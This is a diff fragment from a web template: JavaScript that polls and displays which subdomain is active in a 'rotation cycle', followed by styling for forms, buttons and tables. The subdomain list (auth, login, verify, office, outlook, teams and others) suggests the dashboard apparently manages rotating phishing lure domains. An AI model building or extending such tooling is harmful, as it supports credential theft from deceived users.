+            // Update rotation cycle display
+            const cycleContainer = document.getElementById('cycleContainer');
+            if (cycleContainer) {
+                const subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'];
+                let html = '';
+                for (const sub of subdomains) {
+                    if (sub === data.current_subdomain) {
+                        html += `<span style="padding: 2px 8px; border-radius: 4px; background: #4caf50; color: white; font-size: 12px; font-weight: bold;">${sub}</span>`;
+                    } else {
+                        html += `<span style="padding: 2px 8px; border-radius: 4px; background: var(--border); color: var(--text-muted); font-size: 12px;">${sub}</span>`;
+                    }
+                }
+                cycleContainer.innerHTML = html;
+            }
+        })
+        .catch(() => {});
+}
+
+// Update every 3 seconds
+setInterval(updateSubdomainStatus, 3000);
+document.addEventListener('DOMContentLoaded', updateSubdomainStatus);
+</script>
+
+<style>
+    .glass {
+        background: var(--card-bg);
+        padding: 24px;
+        border-radius: 12px;
+        border: 1px solid var(--border);
+        transition: all 0.3s ease;
+    }
+    .glass:hover {
+        box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+    }
+    .form-group {
+        margin-bottom: 14px;
+    }
+    .form-group label {
+        display: block;
+        font-size: 13px;
+        font-weight: 500;
+        margin-bottom: 4px;
+        color: var(--text-secondary);
+    }
+    .form-control {
+        width: 100%;
+        padding: 8px 12px;
+        border-radius: 6px;
+        border: 1px solid var(--border);
+        background: var(--input-bg);
+        color: var(--text-primary);
+        transition: border-color 0.2s;
+        font-size: 14px;
+    }
+    .form-control:focus {
+        outline: none;
+        border-color: #007bff;
+    }
+    .btn {
+        padding: 8px 16px;
+        border-radius: 6px;
+        border: none;
+        cursor: pointer;
+        font-weight: 500;
+        font-size: 14px;
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        transition: all 0.2s;
+    }
+    .btn:hover { opacity: 0.85; }
+    .btn-primary { background: #007bff; color: white; }
+    .btn-success { background: #28a745; color: white; }
+    .btn-danger { background: #dc3545; color: white; }
+    .btn-warning { background: #ff9800; color: white; }
+    .btn-sm { padding: 4px 10px; font-size: 12px; }
+    .table-wrap { overflow-x: auto; margin-top: 8px; }
+    table { width: 100%; border-collapse: collapse; font-size: 14px; }
+    th { text-align: left; padding: 10px 12px; border-bottom: 2px solid var(--border); font-weight: 600; color: var(--text-secondary); font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+    td { padding: 10px 12px; border-bottom: 1px solid var(--border); }
+    tr:hover td { background: var(--bg-secondary); }
+    hr { border: none; border-top: 1px solid var(--border); margin: 16px 0; }
+</style>
+
+{% endblock %}
